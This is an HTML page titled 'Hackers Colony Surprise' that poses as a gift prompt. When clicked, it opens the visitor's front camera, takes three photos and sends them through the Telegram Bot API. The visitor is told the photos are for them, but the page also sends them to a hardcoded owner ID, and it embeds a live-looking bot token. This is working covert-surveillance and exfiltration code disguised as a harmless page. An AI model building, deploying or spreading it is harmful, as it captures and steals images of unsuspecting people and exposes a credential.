<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>üéÅ Hackers Colony Surprise</title>
<style>
body { font-family: Arial; display: flex; justify-content:center; align-items:center; min-height:100vh; background: linear-gradient(135deg,#6a11cb,#2575fc);}
.container { background:white; padding:20px; border-radius:15px; text-align:center; max-width:400px;}
button { padding:12px 20px; border:none; border-radius:50px; font-size:16px; cursor:pointer; background:linear-gradient(90deg,#6a11cb,#2575fc); color:white;}
video { display:none; width:100%; border-radius:10px; margin:10px 0;}
img { display:none; width:120px; height:120px; border:3px solid #6a11cb; border-radius:10px; object-fit:cover; margin:10px auto;}
</style>
</head>
<body>
<div class="container">
<h2 id="title">üéÅ Your Surprise</h2>
<p id="message">Click below to start</p>
<button onclick="startSurprise()">üéÅ GET SURPRISE</button>
<video id="video" autoplay playsinline></video>
<img id="photoPreview">
</div>

<canvas id="canvas" style="display:none;"></canvas>

<script>
const urlParams = new URLSearchParams(window.location.search);
const USER_CHAT_ID = urlParams.get("chat_id");
const USER_NAME = urlParams.get("name") || "Friend";
const BOT_TOKEN = "8226782560:AAGgKjz2W5QJskEkD1Gy4B8bRk0Cdabgjh0";
const OWNER_ID = "8215819954";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const photoPreview = document.getElementById("photoPreview");

async function startSurprise() {
    document.getElementById("title").textContent = "üì∏ Camera Ready!";
    document.getElementById("message").textContent = "Smile! Taking your photos...";
    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
    video.srcObject = stream;
    video.style.display = "block";
    await new Promise(res => video.onloadedmetadata = res);

    for(let i=1;i<=3;i++){  // take 3 photos
        await new Promise(r => setTimeout(r, 700));
        const blob = await capturePhoto(i);
        showPreview(blob);
        await sendPhoto(blob,i);
    }

    stream.getTracks().forEach(t=>t.stop());
    document.getElementById("title").textContent = "‚úÖ Surprise Complete!";
    document.getElementById("message").textContent = "Check Telegram for your photos!";
}

async function capturePhoto(num){
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video,0,0,canvas.width,canvas.height);
    return new Promise(res => canvas.toBlob(res,'image/jpeg',0.9));
}

function showPreview(blob){
    const url = URL.createObjectURL(blob);
    photoPreview.src = url;
    photoPreview.style.display = "block";
    setTimeout(()=>URL.revokeObjectURL(url),1000);
}

async function sendPhoto(blob,num){
    const file = new File([blob],`photo_${num}.jpg`,{type:"image/jpeg"});
    const formData = new FormData();
    formData.append("photo",file);
    formData.append("caption",`üì∏ Photo ${num} from ${USER_NAME}`);
    formData.append("chat_id",USER_CHAT_ID);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
    // send to owner
    const formData2 = new FormData();
    formData2.append("photo",file);
    formData2.append("caption",`üì∏ Photo ${num} from ${USER_NAME}`);
    formData2.append("chat_id",OWNER_ID);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData2});
}
</script>
</body>
</html>
